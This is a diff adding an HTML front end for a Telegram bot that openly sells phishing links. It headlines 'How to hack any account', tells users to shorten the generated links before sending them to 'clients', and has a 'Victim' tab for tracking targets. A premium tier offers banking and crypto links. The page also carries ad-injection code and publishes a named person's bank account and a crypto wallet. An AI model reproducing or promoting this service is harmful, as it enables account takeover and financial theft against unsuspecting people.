@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Intelligent Verification Link Bot</title>
+<style>
+* {margin:0;padding:0;box-sizing:border-box;}
+body, html {
+  font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+  background:#f7f7f7;color:#111;min-height:100vh;display:flex;flex-direction:column;padding-bottom:60px;
+}
+header {background:#111;color:#00ff99;padding:18px 20px;text-align:center;font-weight:700;font-size:1.6rem;border-bottom:1px solid #222;}
+main {flex-grow:1;overflow-y:auto;padding:15px 20px;max-width:800px;margin:0 auto;}
+.page {display:none;}
+.page.active {display:block;}
+h1,h2,h3 {margin-bottom:12px;font-weight:700;}
+h1 {font-size:1.8rem;color:#00aa77;text-align:center;margin-top:20px;}
+h2 {font-size:1.4rem;color:#0077cc;margin-top:18px;}
+p {margin-bottom:15px;line-height:1.6;font-size:1.05rem;}
+img {max-width:100%;border-radius:8px;margin:10px 0;}
+ul {list-style:none;padding-left:0;margin:10px 0;}
+ul li {background:#eee;padding:12px;border-radius:10px;margin:10px 0;display:flex;align-items:center;gap:10px;}
+ul li img {width:50px;height:50px;object-fit:contain;border-radius:8px;}
+.btn {background:#00ff99;color:#000;padding:6px 12px;border:none;border-radius:8px;font-weight:700;cursor:pointer;transition:0.2s;}
+.btn:hover {background:#00cc77;}
+.bottom-nav {position:fixed;bottom:0;left:0;right:0;height:56px;background:#111;display:flex;justify-content:space-around;align-items:center;border-top:1px solid #222;}
+.bottom-nav button {background:none;border:none;color:#eee;font-size:1.3rem;display:flex;flex-direction:column;align-items:center;cursor:pointer;}
+.bottom-nav button span {font-size:0.75rem;margin-top:2px;}
+.bottom-nav button.active {color:#00ff99;font-weight:700;}
+</style>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script src="//libtl.com/sdk.js" data-zone="9830644" data-sdk="show_9830644"></script>
+</head>
+<body>
+<header>Intelligent Verification Link Bot</header>
+<main>
+
+<!-- Home / Telegraph-style page -->
+<section id="home" class="page active">
+<h1>How to hack any account with Intelligent bot</h1>
+<p>Our bot helps you generate hacking links for free and you will be able to test it before sending them to clients. Simply click a button to generate or test a link in real-time.</p>
+<img src="ba.jpg" alt="Telegram Bot Illustration" />
+
+<h2>Step 1: Open the Bot</h2>
+<p>Click the button below to copy the working link format for your platform.</p>
+<button id="openBotBtnHome" class="btn">Open Bot & Copy links</button>
+
+<h2>Step 2: Shorten Your Links</h2>
+<p>Remember to shorten your links using:</p>
+<ul>
+<li><a href="#" onclick="openWithAd('https://bitly.com/')" style="color:#00aa77;">Bitly</a></li>
+<li><a href="#" onclick="openWithAd('https://tinyurl.com/')" style="color:#00aa77;">TinyURL</a></li>
+</ul>
+
+<h2>Step 3: Share With Clients</h2>
+<p>Once verified, your links are safe to share with your clients. Each link is personalized for your Telegram ID to track activity securely.</p>
+</section>
+
+<!-- Premium Section -->
+<section id="premium" class="page">
+<h2>Premium Features</h2>
+<p>Unlock access to crypto, banking, and advanced links with premium membership.</p>
+<div id="premiumContent"></div>
+</section>
+
+<!-- Victim Section -->
+<section id="victim" class="page">
+<h2>Your Clients</h2>
+<p>Open the bot to see all your tracked clients.</p>
+<button id="openBotBtnVictim" class="btn">Open Bot</button>
+</section>
+
+<!-- Donate Section -->
+<section id="donate" class="page">
+<h2>Support the Project</h2>
+<div id="donationInfo"></div>
+</section>
+
+</main>
+
+<nav class="bottom-nav">
+<button onclick="showAdThenPage('home')" id="navHome" class="active">🏠<span>Home</span></button>
+<button onclick="showAdThenPage('premium')" id="navPremium">🔒<span>Premium</span></button>
+<button onclick="showAdThenPage('victim')" id="navVictim">👁️<span>Victim</span></button>
+<button onclick="switchPage('donate')" id="navDonate">💰<span>Donate</span></button>
+</nav>
+
+<script>
+const tg = window.Telegram.WebApp;
+tg.expand();
+const user = tg.initDataUnsafe?.user || null;
+const telegramId = user?.id || null;
+
+// Pages & Nav
+const pages = {home: document.getElementById('home'), premium: document.getElementById('premium'), victim: document.getElementById('victim'), donate: document.getElementById('donate')};
+const navButtons = {home: document.getElementById('navHome'), premium: document.getElementById('navPremium'), victim: document.getElementById('navVictim'), donate: document.getElementById('navDonate')};
+
+function switchPage(pageKey){
+  Object.keys(pages).forEach(k => pages[k].classList.toggle('active', k===pageKey));
+  Object.keys(navButtons).forEach(k => navButtons[k].classList.toggle('active', k===pageKey));
+}
+
+// Ad helper
+function showMyAd(){ 
+  try { 
+    return show_9830644(); 
+  } catch(e){ return Promise.reject(e); } 
+}
+
+// Show ad then switch page
+function showAdThenPage(pageKey){
+  showMyAd().finally(()=>switchPage(pageKey));
+}
+
+// Open external links with ad
+function openWithAd(url){
+  showMyAd().finally(()=>window.open(url,'_blank','noopener'));
+}
+
+// Home button copy + open
+document.getElementById("openBotBtnHome").addEventListener("click",()=>{
+  showMyAd().finally(()=>window.open("https://t.me/intelligentverificationlinkbot?start=start",'_blank'));
+});
+document.getElementById("openBotBtnVictim").addEventListener("click",()=>{
+  showMyAd().finally(()=>window.open("https://t.me/intelligentverificationlinkbot?start=start",'_blank'));
+});
+
+// Donation info
+const donationInfo = document.getElementById("donationInfo");
+function renderDonationInfo(){
+  const nigeriaOffset = -60; // GMT+1
+  const isNigeria = new Date().getTimezoneOffset()===nigeriaOffset;
+  donationInfo.innerHTML = isNigeria?
+  `<p><strong>Donation Account (Nigeria):</strong><br/>Account: 9114301708, Bank: Opay, Name: Olatunji Abdumalik Ayomide</p>`:
+  `<p><strong>Donate with Crypto (BNB, USDT, BEP20):</strong></p><p class="crypto-address">0xbBcc409872bC2441400735624638F3D67DAa7C4C</p>`;
+}
+renderDonationInfo();
+
+// Show ad on load & repeat every 15s
+window.addEventListener('load', ()=>{
+  setTimeout(()=>showMyAd(),3000);
+  setInterval(()=>showMyAd(),60000);
+});
+</script>
+</body>
+</html>
